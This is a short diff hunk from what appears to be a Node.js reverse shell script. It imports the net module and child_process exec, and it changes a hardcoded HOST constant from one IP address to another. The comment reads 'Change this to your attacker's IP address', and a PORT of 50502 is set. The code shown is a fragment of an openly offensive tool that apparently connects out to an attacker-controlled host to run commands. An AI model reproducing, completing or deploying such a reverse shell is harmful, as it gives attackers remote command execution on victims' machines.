@@ -5,7 +5,7 @@ const net = require("net");
 const { exec } = require("child_process");
 
 
-const HOST = "141.136.44.52"; // Change this to your attacker's IP address
+const HOST = "147.93.122.250"; // Change this to your attacker's IP address
 
 const PORT = 50502; // Change this to your desired port
 
